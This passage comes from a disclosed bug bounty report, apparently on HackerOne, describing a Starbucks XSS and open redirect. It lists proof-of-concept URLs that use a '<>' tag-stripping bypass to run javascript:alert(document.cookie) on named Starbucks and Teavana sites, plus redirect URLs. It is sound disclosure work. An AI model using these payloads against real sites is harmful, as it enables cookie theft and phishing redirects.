I have digged up further and then I have noticed that one can make a redirect by modifying GET parameters with this structure : `\u003c\u003e//google.com`\n\nThere seems to be a stripping of tags and after that some chained redirect, that will eventually trigger an XSS vulnerability if the payload is like : `\u003c\u003ejavascript:alert(document.cookie);`.\n\n__So, based on this I have noticed that all your websites except the starbucks.* are vulnerable to an XSS payload that is written directly in the root URL or almost ANY other get parameter__, thus making almost all the websites exploitable with multiple injection points (starbucks.* seems not affected)\n\nPOC EXAMPLES\n-------\n```\nhttps://shop.starbucks.de/\u003c\u003ejavascript:alert(document.cookie);\nhttps://teavana.com/\u003c\u003ejavascript:alert(document.cookie);\nhttps://store.starbucks.com/\u003c\u003ejavascript:alert(document.cookie);\nhttps://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated\u0026prefv1=\u003c\u003ejavascript:alert('xss parameter');\nhttps://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=\u003c\u003ejavascript:alert('xss parameter');\n```\n\nBonus - open redirect example :\n```\nhttps://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated\u0026prefv1=\u003c\u003e//google.com\nhttps://teavana.com/\u003c\u003e//google.com\n```","bounty_amount":"375.0","formatted_bounty":"$375","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-06-14T19:38:52.258Z","allow_singular_disclosure_after":-136491642.08103004,"singular_disclosure_allowed":true,"vote_count":12,"voters":["spam404","pappan","eveeez","detroitsmash","sa1tama0","sumit7","dr_dragon","spetr0x","rashedhasan007","mrr3boot","and 2 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":12995,"asset_type":"OTHER","asset_identifier":"Other assets","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1409765,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @inhibitor181 \n\nThanks for sending this in!
